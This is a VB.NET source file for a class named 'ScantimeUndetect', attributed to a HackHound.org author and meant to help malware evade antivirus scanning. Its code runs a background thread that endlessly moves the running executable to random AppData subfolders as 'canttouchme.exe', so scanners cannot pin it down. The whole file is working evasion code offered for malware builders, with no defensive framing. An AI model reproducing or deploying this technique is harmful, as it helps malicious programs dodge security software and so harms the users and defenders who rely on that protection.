Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Reflection
Imports System.IO

''' <summary>
''' ScantimeUndetect.vb
''' Original idea and POC by Rottweiler from HackHound.org
''' </summary>
''' <remarks>Uses a lot (~10-20% cpu and ~0.6MB/s disk usage)</remarks>
Public Class ScantimeUndetect

    Private Shared rnd As New Random(-1903770366)
    Private Shared thread As New Thread(AddressOf Runtime)
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto)> _
    Private Shared Function MoveFile(ByVal src As String, ByVal dst As String) As Boolean
    End Function

    Public Shared ReadOnly Property IsRunning() As Boolean
        Get
            If thread IsNot Nothing Then
                Return thread.IsAlive
            Else
                Return False
            End If
        End Get
    End Property

    ''' <summary>
    ''' Starts the scantime undetection process
    ''' </summary>
    ''' <remarks></remarks>
    Public Shared Sub Start()
        If thread IsNot Nothing Then
            If Not thread.IsAlive Then
                thread.Start()
            End If
        Else
            thread = New Thread(AddressOf Runtime)
            thread.Start()
        End If
    End Sub

    ''' <summary>
    ''' Stops the scantime undetection process
    ''' </summary>
    ''' <remarks></remarks>
    Public Shared Sub [Stop]()
        If thread IsNot Nothing Then
            If thread.IsAlive Then
                thread.Abort()
            End If
        End If
    End Sub

    ''' <summary>
    ''' The actual process
    ''' </summary>
    ''' <remarks></remarks>
    Private Shared Sub Runtime()
        Dim lastpath As String = Assembly.GetExecutingAssembly.Location
        Dim nextpath As String = rndPath()
        While True
            MoveFile(lastpath, nextpath)
            lastpath = nextpath
            nextpath = rndPath()
        End While
    End Sub

    ''' <summary>
    ''' Gets a random dir in appdata + \canttouchme.exe
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Shared Function rndPath()
        Dim ls As New List(Of String)
        For Each f As String In Directory.GetDirectories(Environ("APPDATA"))
            ls.Add(f & "\canttouchme.exe")
        Next
        Return ls(rnd.Next(0, ls.Count))
    End Function

End Class